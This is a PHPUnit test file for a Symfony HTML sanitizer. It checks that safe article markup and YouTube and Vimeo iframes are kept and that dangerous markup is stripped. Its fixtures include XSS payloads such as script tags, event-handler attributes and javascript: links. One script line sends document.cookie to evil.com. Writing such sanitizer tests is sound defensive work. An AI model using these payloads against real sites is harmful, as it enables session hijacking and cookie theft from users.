<?php

namespace App\Tests\Twig;

use Symfony\Bundle\FrameworkBundle\Test\KernelTestCase;
use Symfony\Component\HtmlSanitizer\HtmlSanitizerInterface;

class HtmlSanitizerTest extends KernelTestCase
{
    private HtmlSanitizerInterface $sanitizer;

    protected function setUp(): void
    {
        self::bootKernel();
        $this->sanitizer = self::getContainer()->get('html_sanitizer.sanitizer.app.content_sanitizer');
    }

    /**
     * @dataProvider safeHtmlProvider
     */
    public function testAllowsSafeHtml(string $input, string $expected): void
    {
        $result = $this->sanitizer->sanitize($input);
        $this->assertSame($expected, $result);
    }

    public static function safeHtmlProvider(): array
    {
        return [
            'paragraph' => [
                '<p>Hello World</p>',
                '<p>Hello World</p>',
            ],
            'bold and italic' => [
                '<p><strong>Bold</strong> and <em>italic</em></p>',
                '<p><strong>Bold</strong> and <em>italic</em></p>',
            ],
            'headings' => [
                '<h1>Title</h1><h2>Subtitle</h2>',
                '<h1>Title</h1><h2>Subtitle</h2>',
            ],
            'lists' => [
                '<ul><li>Item 1</li><li>Item 2</li></ul>',
                '<ul><li>Item 1</li><li>Item 2</li></ul>',
            ],
            'link with safe attributes' => [
                '<a href="https://example.com" title="Example">Link</a>',
                '<a href="https://example.com" title="Example">Link</a>',
            ],
            'image with safe attributes' => [
                '<img src="https://www.youtube.com/image.jpg" alt="Image" width="100" height="100">',
                '<img src="https://www.youtube.com/image.jpg" alt="Image" width="100" height="100" />',
            ],
            'table' => [
                '<table><tr><th>Header</th></tr><tr><td>Cell</td></tr></table>',
                '<table><tr><th>Header</th></tr><tr><td>Cell</td></tr></table>',
            ],
            'blockquote' => [
                '<blockquote>Quote</blockquote>',
                '<blockquote>Quote</blockquote>',
            ],
        ];
    }

    /**
     * @dataProvider dangerousHtmlProvider
     */
    public function testRemovesDangerousHtml(string $input, string $expected): void
    {
        $result = $this->sanitizer->sanitize($input);
        $this->assertSame($expected, $result);
    }

    public static function dangerousHtmlProvider(): array
    {
        return [
            'script tag' => [
                '<p>Hello</p><script>alert("xss")</script>',
                '<p>Hello</p>',
            ],
            'onclick attribute' => [
                '<p onclick="alert(\'xss\')">Click me</p>',
                '<p>Click me</p>',
            ],
            'onerror on img' => [
                '<img src="x" onerror="alert(\'xss\')">',
                '<img />',
            ],
            'javascript href' => [
                '<a href="javascript:alert(\'xss\')">Click</a>',
                '<a>Click</a>',
            ],
            'style tag' => [
                '<style>body { display: none; }</style><p>Text</p>',
                '<p>Text</p>',
            ],
            'onmouseover' => [
                '<div onmouseover="alert(\'xss\')">Hover</div>',
                '<div>Hover</div>',
            ],
            'data uri in img' => [
                '<img src="data:text/html,<script>alert(\'xss\')</script>">',
                '<img />',
            ],
            'form tag' => [
                '<form action="/steal"><input type="text"></form>',
                '',
            ],
            'object tag' => [
                '<object data="malicious.swf"></object>',
                '',
            ],
            'embed tag' => [
                '<embed src="malicious.swf">',
                '',
            ],
        ];
    }

    /**
     * @dataProvider youtubeIframeProvider
     */
    public function testAllowsYoutubeIframes(string $input): void
    {
        $result = $this->sanitizer->sanitize($input);
        $this->assertStringContainsString('<iframe', $result);
        $this->assertStringContainsString('youtube', $result);
    }

    public static function youtubeIframeProvider(): array
    {
        return [
            'youtube.com' => [
                '<iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" width="560" height="315" allowfullscreen></iframe>',
            ],
            'youtube-nocookie.com' => [
                '<iframe src="https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ" width="560" height="315"></iframe>',
            ],
        ];
    }

    /**
     * @dataProvider vimeoIframeProvider
     */
    public function testAllowsVimeoIframes(string $input): void
    {
        $result = $this->sanitizer->sanitize($input);
        $this->assertStringContainsString('<iframe', $result);
        $this->assertStringContainsString('vimeo', $result);
    }

    public static function vimeoIframeProvider(): array
    {
        return [
            'player.vimeo.com' => [
                '<iframe src="https://player.vimeo.com/video/123456789" width="640" height="360"></iframe>',
            ],
        ];
    }

    public function testBlocksUnauthorizedIframes(): void
    {
        $input = '<iframe src="https://malicious-site.com/embed"></iframe>';
        $result = $this->sanitizer->sanitize($input);
        // The iframe tag is kept but the malicious src is stripped
        $this->assertStringNotContainsString('malicious-site.com', $result);
    }

    public function testBlocksHttpIframes(): void
    {
        // HTTP (non-HTTPS) should be blocked
        $input = '<iframe src="http://www.youtube.com/embed/dQw4w9WgXcQ"></iframe>';
        $result = $this->sanitizer->sanitize($input);
        // The iframe should either be removed or the src should be empty
        $this->assertThat(
            $result,
            $this->logicalOr(
                $this->equalTo(''),
                $this->stringContains('<iframe></iframe>'),
                $this->logicalNot($this->stringContains('http://'))
            )
        );
    }

    public function testPreservesComplexArticleContent(): void
    {
        $input = <<<HTML
<h1>Article Title</h1>
<p>This is a <strong>bold</strong> statement with a <a href="https://example.com">link</a>.</p>
<img src="https://example.com/photo.jpg" alt="Photo" width="800">
<h2>Video Section</h2>
<iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" width="560" height="315" allowfullscreen></iframe>
<ul>
    <li>First item</li>
    <li>Second item</li>
</ul>
<blockquote>A famous quote</blockquote>
HTML;

        $result = $this->sanitizer->sanitize($input);

        $this->assertStringContainsString('<h1>Article Title</h1>', $result);
        $this->assertStringContainsString('<strong>bold</strong>', $result);
        $this->assertStringContainsString('<a href="https://example.com">link</a>', $result);
        $this->assertStringContainsString('<img', $result);
        $this->assertStringContainsString('<iframe', $result);
        $this->assertStringContainsString('youtube.com', $result);
        $this->assertStringContainsString('<ul>', $result);
        $this->assertStringContainsString('<blockquote>', $result);
    }

    public function testSanitizesArticleWithXssAttempt(): void
    {
        $input = <<<HTML
<h1>Normal Title</h1>
<p>Normal paragraph</p>
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
<img src="x" onerror="alert('xss')">
<a href="javascript:alert('xss')">Malicious Link</a>
<p onclick="stealData()">Clickjacking attempt</p>
HTML;

        $result = $this->sanitizer->sanitize($input);

        // Safe content preserved
        $this->assertStringContainsString('<h1>Normal Title</h1>', $result);
        $this->assertStringContainsString('<p>Normal paragraph</p>', $result);

        // Dangerous content removed
        $this->assertStringNotContainsString('<script>', $result);
        $this->assertStringNotContainsString('onerror', $result);
        $this->assertStringNotContainsString('javascript:', $result);
        $this->assertStringNotContainsString('onclick', $result);
        $this->assertStringNotContainsString('stealData', $result);
    }
}
